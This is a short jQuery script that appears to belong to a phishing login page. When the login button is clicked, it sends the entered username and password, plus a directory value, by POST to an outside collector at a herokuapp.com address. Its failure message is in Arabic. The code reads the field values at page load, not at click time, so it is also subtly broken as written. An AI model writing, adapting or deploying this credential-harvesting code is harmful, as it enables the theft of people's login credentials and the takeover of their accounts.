$(function(){
    

    var myLink = 'https://analiza-new.herokuapp.com/POST.php';
    var myUser = $('#user-name').val()
    var myPass = $('#my-pass').val()
    var myDir1  = $('#rel').val();

    if(myDir1.length > 1){
      var myDir = myDir1;
    }else{
      var myDir = 'default';
    }

    console.log(myLink);
    

    $('#log-in').click(function() {

        var request = $.ajax({
            url: myLink,
            method: "POST",
            data: { user1 : myUser, pass1 : myPass, dir1 : myDir },
            dataType: "html"
          });
           
          request.done(function( msg ) {
            console.log('Done1');
          });
          request.fail(function( jqXHR, textStatus ) {
            alert( "فشل الطلب: " + textStatus );
          });


    });


});
